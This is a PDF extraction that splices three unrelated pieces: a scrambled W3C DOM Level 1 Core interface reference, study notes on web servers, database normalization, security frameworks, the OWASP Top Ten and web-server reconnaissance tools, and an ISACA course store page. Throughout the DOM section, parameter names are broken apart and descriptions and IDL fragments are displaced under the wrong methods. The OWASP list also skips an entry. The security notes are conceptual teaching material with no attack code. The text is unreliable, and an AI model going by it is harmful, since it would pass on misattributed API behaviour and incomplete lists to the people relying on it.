As the nodeName attribute is used to derive the name which the node must be stored under, multiple nodes of certain types (those that have a
 "special" string value) cannot be stored as the names would clash. This is seen as preferable to allowing nodes to be aliased.
Parameters
a r g
Return Value
If the new Node replaces an existing node with the same name the previously existing Node is returned, otherwise null is returned.
Exceptions
DOMException
WRONG_DOCUMENT_ERR: Raised if arg was created from a different document than the one that created the NamedNodeMap.
NO_MODIFICATION_ALLOWED_ERR: Raised if this NamedNodeMap is readonly.
INUSE_ATTRIBUTE_ERR: Raised if arg is an Attr that is already an attribute of another Element object. The DOM user must explicitly clone Attr nodes to re-use them in other elements.
removeNamedItem
Removes a node specified by name. If the removed node is an Attr with a default value it is immediately replaced. Parameters
A node to store in a named node map. The node will later be accessible using the value of the nodeName attribute of the node. If a node with that name is already present in the map, it is replaced by the new one.
         nam e
Return Value
The name of a node to remove.
The node removed from the map or null if no node with such a name
exists.
Exceptions
DOMException
 NOT_FOUND_ERR: Raised if there is no node named name in the map.
item
Returns the indexth item in the map. If index is greater than or equal to the number of nodes in the map, this returns null.
Parameters
 ind ex
Return Value
Index into the map.
The node at the indexth position in the NamedNodeMap, or null if that is not a valid index.
This method raises no exceptions.
Attributes
length
The number of nodes in the map. The range of valid child node indices is 0 to length-1 inclusive.
Interface CharacterData
The CharacterData interface extends Node with a set of attributes and methods for accessing character data in the DOM. For clarity this set is defined here rather than on each object that uses these attributes and methods. No DOM objects correspond directly to CharacterData, though Text and others do inherit the interface from it. All offsets in this interface start from 0.
IDL Definition
  interface CharacterData : Node {
           attribute  DOMString
                                 //
raises(DOMException) on setting
                                 //
raises(DOMException) on retrieval
  readonly attribute  unsigned long
length;
data;
   DOMString                 substringData(in
unsigned long offset,
 unsigned long count)
in
raises(DOMException);
  void                      appendData(in
DOMString arg)
raises(DOMException);
  void                      insertData(in
unsigned long offset,
DOMString arg)
in
raises(DOMException);
  void                      deleteData(in
unsigned long offset,
unsigned long count)
in
raises(DOMException);
  void                      replaceData(in
unsigned long offset,
unsigned long count,
DOMString arg)
raises(DOMException);
};
in in
Attributes
data
The character data of the node that implements this interface. The DOM implementation may not put arbitrary limits on the amount of data that may be stored in a CharacterData node. However, implementation limits may mean that the entirety of a node's data may not fit into a single DOMString. In such cases, the user may
 call substringData to retrieve the data in appropriately sized pieces.
Exceptions on setting
DOMException
NO_MODIFICATION_ALLOWED_ERR: Raised when the node is readonly.
Exceptions on retrieval
DOMException
DOMSTRING_SIZE_ERR: Raised when it would return more characters than fit in a DOMString variable on the implementation platform.
length
The number of characters that are available through data and
the substringData method below. This may have the value zero, i.e., CharacterData nodes may be empty.
     Methods
substringData
Extracts a range of data from the node.
Parameters
offs et
coun t
Return Value
Start offset of substring to extract.
The number of characters to extract.
 The specified substring. If the sum of offset and count exceeds the length, then all characters to the end of the data are returned.
Exceptions
DOMException
INDEX_SIZE_ERR: Raised if the specified offset is negative or greater than the number of characters in data, or if the specified count is negative.
DOMSTRING_SIZE_ERR: Raised if the specified range of text does not fit into a DOMString.
 appendData
Append the string to the end of the character data of the node. Upon success, data provides access to the concatenation of data and the DOMString specified.
Parameters
 ar g
Exceptions
DOMException
The DOMString to append.
  NO_MODIFICATION_ALLOWED_ERR: Raised if this node is readonly.
This method returns nothing.
insertData
Insert a string at the specified character offset.
 Parameters
offs et
arg
The character offset at which to insert.
The DOMString to insert. INDEX_SIZE_ERR: Raised if the specified offset is negative or greater
than the number of characters in data. NO_MODIFICATION_ALLOWED_ERR: Raised if this node is
readonly.
This method returns nothing.
deleteData
Remove a range of characters from the node. Upon success, data and length reflect the change. Parameters
Exceptions
DOMException
   off The offset from which to remove characters. set
cou The number of characters to delete. If the sum
nt
from offset to the end of the data are deleted.
of offset and count exceeds length then all characters
Exceptions
DOMException
INDEX_SIZE_ERR: Raised if the specified offset is negative or greater than the number of characters in data, or if the specified count is negative.
NO_MODIFICATION_ALLOWED_ERR: Raised if this node is readonly.
This method returns nothing.
replaceData
Replace the characters starting at the specified character offset with the specified string.
Parameters
off The offset from which to start replacing. set
cou The number of characters to replace. If the sum
nt
arg The DOMString with which the range must be replaced.
Exceptions
DOMException
INDEX_SIZE_ERR: Raised if the specified offset is negative or greater than the number of characters in data, or if the specified count is negative.
NO_MODIFICATION_ALLOWED_ERR: Raised if this node is
   of offset and count exceeds length, then all characters to the end of the data are replaced (i.e., the effect is the same as
a remove method call with the same range, followed by
an append method invocation).
 readonly.
This method returns nothing.
Interface Attr
The Attr interface represents an attribute in an Element object. Typically the allowable values for the attribute are defined in a document type definition.
Attr objects inherit the Node interface, but since they are not actually child nodes of the element they describe, the DOM does not consider them part of the document tree. Thus,
the Node attributes parentNode, previousSibling,
and nextSibling have a null value for Attr objects. The DOM takes the view that attributes are properties of elements rather than having a separate identity from the elements they are associated with; this should make it more efficient to implement such features as default attributes associated with all elements of a given type.
Furthermore, Attr nodes may not be immediate children of
a DocumentFragment. However, they can be associated
with Element nodes contained within a DocumentFragment. In short, users and implementors of the DOM need to be aware
that Attr nodes have some things in common with other objects inheriting the Node interface, but they also are quite distinct.
The attribute's effective value is determined as follows: if this attribute has been explicitly assigned any value, that value is the attribute's effective value; otherwise, if there is a declaration for this attribute, and that declaration includes a default value, then that default value is the attribute's effective value; otherwise, the attribute does not exist on this element in the structure model until it has been explicitly added. Note that the nodeValue attribute on the Attr instance can also be used to retrieve the string version of the attribute's value(s).
In XML, where the value of an attribute can contain entity references, the child nodes of the Attr node provide a representation in which
         entity references are not expanded. These child nodes may be
either Text or EntityReference nodes. Because the attribute type may be unknown, there are no tokenized attribute values.
IDL Definition
   interface Attr : Node {
  readonly attribute  DOMString
  readonly attribute  boolean
name;
 specified;
value; };
attribute  DOMString
Attributes
name
Returns the name of this attribute.
specified
If this attribute was explicitly given a value in the original document, this is true; otherwise, it is false. Note that the implementation is in charge of this attribute, not the user. If the user changes the value of the attribute (even if it ends up having the same value as the default value) then the specified flag is automatically flipped to true. To re- specify the attribute as the default value from the DTD, the user must delete the attribute. The implementation will then make a new attribute available with specified set to false and the default value (if one exists).
In summary:
- If the attribute has an assigned value in the document
then specified is true, and the value is the assigned value.
- If the attribute has no assigned value in the document and has a default value in the DTD, then specified is false, and the value is the default value in the DTD.
- If the attribute has no assigned value in the document and has a
value of #IMPLIED in the DTD, then the attribute does not appear
in the structure model of the document.
value
   On retrieval, the value of the attribute is returned as a string. Character and general entity references are replaced with their values.
On setting, this creates a Text node with the unparsed contents of the string.
Interface Element
By far the vast majority of objects (apart from text) that authors encounter when traversing a document are Element nodes. Assume the following XML document:
When represented using DOM, the top node is an Element node for "elementExample", which contains two child Element nodes, one for "subelement1" and one for "subelement2". "subelement1" contains no child nodes.
Elements may have attributes associated with them; since
the Element interface inherits from Node, the generic Node interface method getAttributes may be used to retrieve the set of all attributes for an element. There are methods on the Element interface to retrieve either an Attr object by name or an attribute value by name. In XML, where an attribute value may contain entity references,
an Attr object should be retrieved to examine the possibly fairly complex sub-tree representing the attribute value. On the other hand, in HTML, where all attributes have simple string values, methods to directly access an attribute value can safely be used as a convenience.
IDL Definition
 <elementExample id="demo">
  <subelement1/>
  <subelement2><subsubelement/></subelement2>
</elementExample>
     interface Element : Node {
  readonly attribute  DOMString
tagName;
  DOMString                 getAttribute(in
DOMString name);
  void                      setAttribute(in
DOMString name,
  DOMString value)
in
raises(DOMException);
  void                      removeAttribute(in
DOMString name)
raises(DOMException);
  Attr                      getAttributeNode(in
DOMString name);
  Attr                      setAttributeNode(in
Attr newAttr)
raises(DOMException);
  Attr
removeAttributeNode(in Attr oldAttr)
raises(DOMException);
  NodeList
getElementsByTagName(in DOMString name);
  void                      normalize();
};
Attributes
tagName
The name of the element. For example, in:
tagName has the value "elementExample". Note that this is case- preserving in XML, as are all of the operations of the DOM. The HTML DOM returns the tagName of an HTML element in the canonical uppercase form, regardless of the case in the source HTML document.
 <elementExample id="demo">
        ...
</elementExample> ,
 Methods
getAttribute
Retrieves an attribute value by name.
Parameters
nam e
The name of the attribute to retrieve.
 Return Value
to remove.
The Attr value as a string, or the empty string if that attribute does not
have a specified or default value.
This method raises no exceptions.
setAttribute
Adds a new attribute. If an attribute with that name is already present in the element, its value is changed to be that of the value parameter. This value is a simple string, it is not parsed as it is being set. So any markup (such as syntax to be recognized as an entity reference) is treated as literal text, and needs to be appropriately escaped by the implementation when it is written out. In order to assign an attribute value that contains entity references, the user must create an Attr node plus
any Text and EntityReference nodes, build the appropriate subtree, and use setAttributeNode to assign it as the value of an attribute.
Parameters
      nam e
val ue
Exceptions
DOMException
The name of the attribute to create or alter.
Value to set in string form.
  INVALID_CHARACTER_ERR: Raised if the specified name contains an invalid character.
NO_MODIFICATION_ALLOWED_ERR: Raised if this node is readonly.
This method returns nothing.
removeAttribute
Removes an attribute by name. If the removed attribute has a default value it is immediately replaced.
Parameters
 nam e
The name of the attribute Exceptions
DOMException
NO_MODIFICATION_ALLOWED_ERR: Raised if this node is readonly.
  This method returns nothing.
getAttributeNode
Retrieves an Attr node by name. Parameters
nam e
Return Value
The name of the attribute to retrieve.
  The Attr node with the specified attribute name or null if there is no such attribute.
This method raises no exceptions.
setAttributeNode
Adds a new attribute. If an attribute with that name is already present in the element, it is replaced by the new one.
Parameters
  newAt tr
Return Value
The Attr node to add to the attribute list.
 If the newAttr attribute replaces an existing attribute with the same name, the previously existing Attr node is returned, otherwise null is returned.
Exceptions
DOMException
WRONG_DOCUMENT_ERR: Raised if newAttr was created from a different document than the one that created the element.
NO_MODIFICATION_ALLOWED_ERR: Raised if this node is readonly.
   INUSE_ATTRIBUTE_ERR: Raised if newAttr is already an attribute of another Element object. The DOM user must explicitly
clone Attr nodes to re-use them in other elements.
removeAttributeNode
Removes the specified attribute.
Parameters
old Att r
Return Value
The Attr node that was removed.
Exceptions
DOMException
NO_MODIFICATION_ALLOWED_ERR: Raised if this node is readonly.
NOT_FOUND_ERR: Raised if oldAttr is not an attribute of the element.
getElementsByTagName
Returns a NodeList of all descendant elements with a given tag name, in the order in which they would be encountered in a preorder traversal of the Element tree.
Parameters
  The Attr node to remove from the attribute list. If the removed Attr has a default value it is immediately replaced.
       nam e
Return Value
The name of the tag to match on. The special value "*" matches all tags.
A list of matching Element nodes.
This method raises no exceptions.
normalize
Puts all Text nodes in the full depth of the sub-tree underneath this Element into a "normal" form where only markup (e.g., tags,
 comments, processing instructions, CDATA sections, and entity references) separates Text nodes, i.e., there are no
adjacent Text nodes. This can be used to ensure that the DOM view of a document is the same as if it were saved and re-loaded, and is useful when operations (such as XPointer lookups) that depend on a particular document tree structure are to be used.
This method has no parameters. This method returns nothing. This method raises no exceptions. Interface Text
The Text interface represents the textual content (termed character
data in XML) of an Element or Attr. If there is no markup inside an element's content, the text is contained in a single object implementing the Text interface that is the only child of the element. If there is markup, it is parsed into a list of elements and Text nodes that form the list of children of the element.
When a document is first made available via the DOM, there is only
one Text node for each block of text. Users may create
adjacent Text nodes that represent the contents of a given element without any intervening markup, but should be aware that there is no way to represent the separations between these nodes in XML or HTML, so they will not (in general) persist between DOM editing sessions.
The normalize() method on Element merges any such
adjacent Text objects into a single node for each block of text; this is recommended before employing operations that depend on a particular document structure, such as navigation with XPointers.
IDL Definition
       interface Text : CharacterData {
  Text                      splitText(in
unsigned long offset)
raises(DOMException);
};
 Methods
splitText
Breaks this Text node into two Text nodes at the specified offset, keeping both in the tree as siblings. This node then only contains all the content up to the offset point. And a new Text node, which is inserted as the next sibling of this node, contains all the content at and after the offset point.
Parameters
 offs et
Return Value
The new Text node.
Exceptions
DOMException
The offset at which to split, starting from 0.
  INDEX_SIZE_ERR: Raised if the specified offset is negative or greater than the number of characters in data.
NO_MODIFICATION_ALLOWED_ERR: Raised if this node is readonly.
Interface Comment
This represents the content of a comment, i.e., all the characters between the starting '<!--' and ending '-->'. Note that this is the definition of a comment in XML, and, in practice, HTML, although some HTML tools may implement the full SGML comment structure.
IDL Definition
1.3. Extended Interfaces
The interfaces defined here form part of the DOM Level 1 Core specification, but objects that expose these interfaces will never be
interface Comment : CharacterData {
};
 encountered in a DOM implementation that deals only with HTML. As such, HTML-only DOM implementations do not need to have objects that implement these interfaces.
Interface CDATASection
CDATA sections are used to escape blocks of text containing characters that would otherwise be regarded as markup. The only delimiter that is recognized in a CDATA section is the "]]>" string that ends the CDATA section. CDATA sections can not be nested. The primary purpose is for including material such as XML fragments, without needing to escape all the delimiters.
The DOMString attribute of the Text node holds the text that is contained by the CDATA section. Note that this may contain characters that need to be escaped outside of CDATA sections and that, depending on the character encoding ("charset") chosen for serialization, it may be impossible to write out some characters as part of a CDATA section.
The CDATASection interface inherits
the CharacterData interface through the Text interface. Adjacent CDATASections nodes are not merged by use of the Element.normalize() method.
IDL Definition
Interface DocumentType
Each Document has a doctype attribute whose value is
either null or a DocumentType object.
The DocumentType interface in the DOM Level 1 Core provides an interface to the list of entities that are defined for the document, and little else because the effect of namespaces and the various XML scheme efforts on DTD representation are not clearly understood as of this writing.
   interface CDATASection : Text {
};
 The DOM Level 1 doesn't support editing DocumentType nodes. IDL Definition
interface DocumentType : Node {
  readonly attribute  DOMString
  readonly attribute  NamedNodeMap
entities;
  readonly attribute  NamedNodeMap
notations;
};
name;
 Attributes
name
The name of DTD; i.e., the name immediately following
the DOCTYPE keyword.
entities
A NamedNodeMap containing the general entities, both external and internal, declared in the DTD. Duplicates are discarded. For example in:
the interface provides access to foo and bar but not baz. Every node in this map also implements the Entity interface.
The DOM Level 1 does not support editing entities,
therefore entities cannot be altered in any way.
notations
A NamedNodeMap containing the notations declared in the DTD. Duplicates are discarded. Every node in this map also implements the Notation interface.
The DOM Level 1 does not support editing notations,
therefore notations cannot be altered in any way. Interface Notation
This interface represents a notation declared in the DTD. A notation
   <!DOCTYPE ex SYSTEM "ex.dtd" [
  <!ENTITY foo "foo">
  <!ENTITY bar "bar">
  <!ENTITY % baz "baz">
]> <ex/>
     either declares, by name, the format of an unparsed entity (see section 4.7 of the XML 1.0 specification), or is used for formal declaration of Processing Instruction targets (see section 2.6 of the XML 1.0 specification). The nodeName attribute inherited from Node is set to the declared name of the notation.
The DOM Level 1 does not support editing Notation nodes; they are therefore readonly.
A Notation node does not have any parent. IDL Definition
Attributes
publicId
The public identifier of this notation. If the public identifier was not
specified, this is null.
systemId
The system identifier of this notation. If the system identifier was not specified, this is null.
Interface Entity
This interface represents an entity, either parsed or unparsed, in an XML document. Note that this models the entity itself not the entity declaration. Entity declaration modeling has been left for a later Level of the DOM specification.
The nodeName attribute that is inherited from Node contains the name of the entity.
An XML processor may choose to completely expand entities before the structure model is passed to the DOM; in this case there will be
 interface Notation : Node {
  readonly attribute  DOMString
publicId;
  readonly attribute  DOMString
systemId; };
   no EntityReference nodes in the document tree.
XML does not mandate that a non-validating XML processor read and process entity declarations made in the external subset or declared in external parameter entities. This means that parsed entities declared in the external subset need not be expanded by some classes of applications, and that the replacement value of the entity may not be available. When the replacement value is available, the
corresponding Entity node's child list represents the structure of that replacement text. Otherwise, the child list is empty.
The resolution of the children of the Entity (the replacement value) may be lazily evaluated; actions by the user (such as calling
the childNodes method on the Entity Node) are assumed to trigger the evaluation.
The DOM Level 1 does not support editing Entity nodes; if a user wants to make changes to the contents of an Entity, every
related EntityReference node has to be replaced in the structure model by a clone of the Entity's contents, and then the desired changes must be made to each of those clones instead. All the descendants of an Entity node are readonly.
An Entity node does not have any parent. IDL Definition
    interface Entity : Node {
  readonly attribute  DOMString
publicId;
  readonly attribute  DOMString
systemId;
  readonly attribute  DOMString
notationName;
};
 Attributes
publicId
The public identifier associated with the entity, if specified. If the public
 identifier was not specified, this is null.
systemId
The system identifier associated with the entity, if specified. If the system identifier was not specified, this is null.
notationName
For unparsed entities, the name of the notation for the entity. For parsed entities, this is null.
Interface EntityReference
EntityReference objects may be inserted into the structure model when an entity reference is in the source document, or when the user wishes to insert an entity reference. Note that character references and references to predefined entities are considered to be expanded by the HTML or XML processor so that characters are represented by their Unicode equivalent rather than by an entity reference. Moreover, the XML processor may completely expand references to entities while building the structure model, instead of
providing EntityReference objects. If it does provide such objects, then for a given EntityReference node, it may be that there is
no Entity node representing the referenced entity; but if such
an Entity exists, then the child list of the EntityReference node is the same as that of the Entity node. As with the Entity node, all descendants of the EntityReference are readonly.
The resolution of the children of the EntityReference (the replacement value of the referenced Entity) may be lazily evaluated; actions by the user (such as calling the childNodes method on
the EntityReference node) are assumed to trigger the evaluation.
IDL Definition
Interface ProcessingInstruction
The ProcessingInstruction interface represents a "processing instruction", used in XML as a way to keep processor-specific
       interface EntityReference : Node {
};
 information in the text of the document.
IDL Definition
interface ProcessingInstruction : Node {
  readonly attribute  DOMString
 target;
attribute  DOMString
data;
raises(DOMException) on setting
};
//
Attributes
target
The target of this processing instruction. XML defines this as being the
first token following the markup that begins the processing instruction.
data
The content of this processing instruction. This is from the first non white space character after the target to the character immediately preceding the ?>.
Exceptions on setting
DOMException
NO_MODIFICATION_ALLOWED_ERR: Raised when the node is readonly.
   Web Servers
Web servers: host web sites accessible on the Internet,or within an internal network. Organizations place web servers within a demilitarized zone (DMZ) to provide a
layer of protection.
The two primary applications used for web servers are:
- Apache: most popular web server used on the Internet.
  - It’s free and can run on Unix, Linux, and Windows systems.
- Internet Information Services (IIS): a Microsoft web server   - it’s included free with any Windows Server product.
Database Concepts
Several of the secure coding techniques and attacks apply directly to databases SQL: Structured Query Language used to communicate with databases.
- SQL statements: read, insert, update, and delete data to and from a database. - Many web sites use SQL statements to interact with a database, providing users with dynamic content.
Database: a structured set of data.
includes multiple tables and each table holds multiple columns and rows.
Column: identifies the data type, sometimes referred to as attributes. row: represents a record, sometimes called records or tuples. Individual elements within a database are called fields.
Example
the field in the second row of the FirstName column is a field holding the value of Moe.
Normalization
to organizing the tables and columns
to reduce redundant data and improve overall database performance.
Although there are several normal forms, the first three are the most important.
First Normal Form (1NF) 第一范式 无重复的列 1,718

数据库表的每一列都是不可分割的基本数据项，同一列中不能有多
个值，即实体中的某个属性不能有多个值或者不能有重复的属性。
A database is in first normal form if it meets the following three criteria:
- Each row within a table is unique and identified with a primary key
- Related data is contained in a separate table.
  - create one single table to hold all the information, creates multiple
problems.
  - Entering the same information multiple times increases the chance for errors. If she moves to a new address, you need to change theaddress five times.
- None of the columns include repeating groups.
  - example, the Author table includes FirstName for the first name and
LastName for the last name.
  - If you combine these into a single column of name, it violates this rule.
  - It also makes it more difficult to access only one part of the repeating group, such as the first name or the lastname.
 Second Normal Form (2NF)
属性完全依赖于主键 [ 消除部分子函数依赖 ]
applies to tables that have a composite primary key, where two or more columns
make up the full primary key.
BookAuthor table has composite key: Book_BookID column, Author_AuthorID
column.
A database is in 2NF if it meets the following criteria:
It is in 1NF.
Non-primary key attributes are completely dependent on the composite primary key. If any column is dependent on only one column of the composite key, it is not in 2NF.
The BookAuthor table shown in Figure 7.3 violates this with the Publisher column. A book has a unique publisher so the publisher is related to the Book_BookID column. However, an author can publish books through multiple publishers, so the publisher value is not dependent on the Author_AuthorID column.
Notice that the Book table correctly has the Publisher column, so the easy fix to have this database in 2NF is to delete the Publisher column in the BookAuthor table.
Third Normal Form
helps eliminate unnecessary redundancies within a database.
A database is in 3NF if it meets the following criteria:
It is in 2NF. This implies it is also in 1NF.
•All columns that aren’t primary keys are only dependent on the primary key. In other words, none of the columns in the table are dependent on non-primary key attributes. The Book table violates the second rule of 3NF with the PublisherCity column. The city where the publisher is located is dependent on the publisher, not the book. Imagine this table had 100 book entries from the same publisher located in Virginia Beach. When entering the data, you’d need to repeatedly enter Virginia Beach for this publisher.
There are two ways to fix this. First, ask if the city is needed. If not, delete the column and the database is now in 3NF. If the city is needed, you can create another table with publisher data
You would then relate the Publisher table with the Book table
Frameworks and Guides
multiple references available that describe best practices and provide instructions on how to secure systems.
industry- standard frameworks platform- or vendor-specific guides.
Framework: a structure used to provide a foundation.
Cybersecurity frameworks typically use a structure of basic concepts and they
provide guidance to professionals on how to implement security in various systems. Some generic categories of frameworks are:
Regulatory frameworks 调整的
  - based on relevant laws and regulations.
  - Example
  - the Health Insurance Portabilityand Accountability Act (HIPAA) mandates specific protections of all health-related data.
  - The Office of the National Coordinator for Health Information Technology (ONC) and the HHS Office for Civil Rights (OCR) created the HIPAA Security Risk Assessment (SRA) Tool.
  - This tool provides a framework that organizations can use to help ensure compliance with HIPAA.
Non-regulatory framework
  - not required by any law.
  - identifies common standards and best practices that organizations can follow.
  - example, COBIT (Control Objectives for Information and Related Technologies) is a framework that many organizations use to ensure that business goals and IT security goals are linked together.
National versus international.
  - national frameworks: used within a single country.
  - International: used internationally.
  - Example
  - NIST created the Cybersecurity Framework, which focuses on cybersecurity activities and risks within the United States.
  - the International Organization for Standardization (ISO) and the International Electrotechnical Commission (IEC) create and publish international standards.
  - example, ISO/IEC 27002 provides a framework for IT security. Industry-specific frameworks
  - only apply to certain industries.
  - example,
  - organizations that handle credit cards typically comply with the Payment Card Industry Data Security Standard (PCI DSS).
  - PCI DSS includes 12 requirements and over 220 sub-requirements that organizations follow to protect credit card data.
In addition to frameworks, you can also use various guides toincrease security. This includes benchmarks or secure configuration guides, platform- or vendor-
specific guides, and general- purpose guides.
On the surface, this is quite simple.
configuring Windows systems, use a Windows guide to identify secure settings. When configuring Linux systems, use a Linux guide.
Additionally, when configuring a system for a specific role (such as a web server, application server, or network infrastructure device), follow the appropriate guide for that role.
Example
web server: need ports 80 and 443 open for HTTP and HTTPS,
database application server: would not typically need these ports open, so they should be closed on a database application server.
The individual guides for each of the roles provide this information. Web Organizations
some web organizations - IEFT
  - The Internet Engineering Task Force
  - “The goal of the IETF is to make the Internet work better.”
  - IETF creates engineering documents to help make the Internet work better from an engineering point of view.
  - The IETF’s official documents are published free of charge as Requests For Comments (RFCs).
  - An RFC is used to set all sorts of standards, from the makeup of a UDP header to how routing protocols are supposed to work, and almost anything else you can think of.
  - Per the IETF regarding RFCs: “...this name (used since 1969, before the IETF existed) expresses something important: the Internet is a constantly changing technical system, and any document that we write today may need to be updated tomorrow.”
  - When you think IETF, think engineering, and engineering only—they’re not here to police what the engineered solution is used for, just to provide the work to get the thing running.
  - “We try to avoid policy and business questions, as much as possible, to concentrate solely on the engineering side of the house.” They recommend http://www.internetsociety.org/ as a place to go worry about policy.
- World Wide Web Consortium (W3C).   - an international community   - “member organizations, a full-time staff, and the public work together to develop Web standards.” “to lead the World Wide Web to its full potential by developing protocols and guidelines that ensure the long- term growth of the Web.”
  - For example, when incompatible versions of HTML are offered by different vendors, causing inconsistency in how web pages are displayed, the consortium tries to get all those vendors to implement a set of core principles and components that are chosen by the consortium.
  - W3C engages in education and outreach, develops software, and serves as an open forum for discussion about the Web.
- OSSTM, Internet Society, OpenSource. org... - OWASP
  - Open Web Application Security Project
  - a 501(c)(3) worldwide not-for-profit charitable organization
  - focused on improving the security of software.
  - Mission: to make software security visible so that individuals and organizations worldwide can make informed decisions about true software security risks.
  - OWASP publishes all sorts of reports, documents, and training efforts to assist in web security.
Example:
- OWASP Top Ten
- a powerful awareness document for web application security.
- represents a broad consensus about what the most critical web application security flaws are
  - A1 – Injection Flaws: Injection flaws, such as SQL, OS, and LDAP injection, occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.
  - A2 – Broken Authentication and Session Management: Application functions related to authentication and session management are often not implemented correctly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users’ identities.
  - A3 – Cross-Site Scripting (XSS): XSS flaws occur whenever an application takes untrusted data and sends it to a web browser without proper validation or escaping. XSS allows attackers to execute scripts in the victim’s browser, which can hijack user sessions, deface websites, or redirect the user to malicious sites.
  - A4 – Insecure Direct Object References: A direct object reference occurs when a developer exposes a reference to an internal implementation object, such as a file, directory, or database key. Without an access control check or other protection, attackers can manipulate these references to access unauthorized data.
  - A5 – Security Misconfiguration: Good security requires having a secure configuration defined and deployed for the application, frameworks, application server, web server, database server, and platform. Secure settings should be defined, implemented, and maintained, as defaults are often insecure. Additionally, software should be kept up to date. properly protect sensitive data (credit cards, tax IDs, authentication credentials...) Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes. Sensitive data deserves extra protection, like encryption at rest or in transit, and special precautions when exchanged with the browser.
  - A7 – Missing Function Level Access Control: Most web applications verify function level access rights before making that functionality visible in the UI. However, applications need to perform the same access control checks on the server when each function is accessed. If requests are not verified, attackers will be able to forge requests in order to access functionality without proper authorization.
  - A8 – Cross-Site Request Forgery (CSRF): A CSRF attack forces a logged-on victim’s browser to send a forged HTTP request, including the victim’s session cookie and any other automatically included authentication information, to a vulnerable web application. This allows the attacker to force the victim’s browser to generate requests the vulnerable application thinks are legitimate requests from the victim.
  - A9 – Using Components with Known Vulnerabilities: Components, such as libraries, frameworks, and other software modules, almost always run with full privileges. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications using components with known vulnerabilities may undermine application defenses and enable a range of possible attacks and impacts.
  - A10 – Unvalidated Redirects and Forwards: Web applications frequently redirect and forward users to other pages
and websites, and use untrusted data to determine the destination pages. Without proper validation, attackers can redirect victims to phishing or malware sites, or use forwards to access unauthorized pages.
OWASP also provides a really cool option for security education.
- WebGoat
- a deliberately insecure web application maintained by OWASP
- designed to teach web application security lessons.
- “The primary goal of the WebGoat project is simple: create a de- facto interactive teaching environment for web application security. In the future, the project team hopes to extend WebGoat into becoming a security benchmarking platform and a Java-based Web site Honeypot.”
- You can install it on virtually any platform, it can interface with Java or .NET just fine, and it contains dozens of “lessons” displaying security vulnerabilities you should be aware of.
- It’s actually a great idea when you think about it: a box you know is there but don’t know much about holds all sorts of potential security flaws, and you get to test your skillset against it without endangering anything. Not bad for a goat....
Attack Methodology
EC-Council defines six different stages in web server attack methodology:
- information gathering,
- footprinting,
- mirroring websites, - vulnerability scanning,
- session hijacking
- password cracking.
information gathering and footprinting.
- Footprinting, help you identify the web servers.
- The use of whois, banner grabbing
- some tools and actions that are more specialized for web servers.
  - Netcraft: provide some high-level information.
  - HTTPRecon, ID Serve: identifying, reliably, the web server
architecture and OS
  - HTTPrint provides lots of really cool information.
  - Burp Suite: give insight into content on the site the owner probably didn’t want disclosed.
  - BlackWidow, HTTrack: make a copy of the website on system for review.
vulnerability scanner: give you everything you need to gain access.
- Nessus: probably the most common vulnerability scanner.
- Nikto: vulnerability scanner specifically for web servers.
  - An open source tool
  - scans for virtually everything, file problems, script errors, and server configuration errors.
  - It can even be configured within Nessus to kick off a scan automatically when a web server is discovered!
  - Plug-ins and signatures are numerous and varied, and they update automatically for you.
  - The only drawback: a relatively noisy tool, like Nessus and virtually every other vulnerability scanner, won’t be running it stealthily.
good vulnerability scan against a web server
- It won’t necessarily discover any bad unknowns, but it will show you the bad knowns, and that’s all you can hope for at this juncture.
- By their very design websites are open to the world, and many— not all, but many—will have something overlooked.
- Take your time and be patient; eventually your efforts will pay off.
Web Server Architecture
web server acts like any other server: responds to requests from clients and provides a file or service in answer.
- A request first comes from a client to open a TCP connection: usually port 80 or 443.
- After agreeing to the handshake on the page request, the server waits for an HTTP GET request from the client. website page.
- The server then looks through a storage area and finds the code
that matches the request and provides it to the client.
  - a multitude of issues
  - How does the server validate what the client is asking for?
  - Does the server respond only to specific verbiage in the request, or can it get confused and respond with other actions?
  - Where are the actual files of HTML (and other) code stored, and how are the permissions assigned to them?
a couple tips:
First, Apache configuration is almost always done as part of a module within special files (http.conf, for instance, can be used to set server status), and the modules are appropriately named (mod_negotiation, for instance).
Second, almost everything questioned on IIS configuration is going to come down to privileges, and IIS itself runs in the context of LOCAL_SYSTEM and will spawn shells accordingly.
  Store
  Dashboard Introduction Support
Sign In
Create ISACA Account
Bundle: CSX Web Application Security Engineer Pathway
OWASP gives students an understanding on how each of these vulnerabilities that puts organizations at risk.
        Difficulty: Multilevel
CSF Domain: All domains
$600.00
Price represents the non member rate.
Buy Now
or pay later by invoice
        The CSX Website Application Security Engineer Pathway provides students with an extensive knowledge of web application protection. This pathway includes our OWASP Top 10 course as well as diverse labs outlining the importance of securing web apps.
Continuing Professional Education (CPE) Credit Count: 42
Content
  Injection
Lesson objectives:
Lesson and Lab
 - Understand how systems are vulnerable to injection attacks
- Know the different types of injection attacks
- Understand how to protect from injection attacks
Instructional Lab: Injection
- Identify an injection vulnerability present on a simulated organization’s system of responsibility.
Lesson objectives:
- Understand what constitutes a broken authentication
- Know how to identify if an application is vulnerable to broken
authentication
- Understand how to mitigate and prevent broken authentications
Instructional Lab: Broken Authentication
- Identify a broken authentication capability within an organizational application. Once identified, take action to exploit the vulnerability.
Lesson objectives:
- Know how to identify sensitive data
- Determine if the information should be exposed or protected
- Understand how to appropriately protect sensitive data
Instructional Lab: Sensitive Data Exposure
- Enter an environment wherein key organizational data is incorrectly protected. Identify the exposed sensitive data and take steps to protect it from potential misuse
 Lesson and Lab
 Broken Authentication
 Lesson and Lab
 Sensitive Data Exposure  XML External Entities
Lesson and Lab
 Lesson objectives:
- Understand how threat agents exploit vulnerable XML processors
- Know how to identify if an application is vulnerable to XXE
- Understand how to prevent potential XXE exploitations
Instructional Lab: XML External Entities
- Identify a potential XXE exploitation on a network of responsibility and test the exploit on the vulnerable XML processors.
Lesson objectives:
- Understand the elements which make broken access control exploitable
- Know how to identify potential access control bypasses
- Understand how to harden access control mechanisms for an
organization
Instructional Lab: Broken Access Control
- Identify potential broken access mechanisms within the environment, leveraging them to gain access to a system, and then harden the system from additional implementation of the access control.
Lesson objectives:
- Understand the dangers presented with misconfigured systems and networks
- Understand examples of misconfigurations which can make a system vulnerable to exploitation
- Know how to reconfigure certain system applications to increase
 Lesson and Lab
 Broken Access Control
 Lesson and Lab
 Security Misconfigurations security
Instructional Lab: Security Misconfiguration
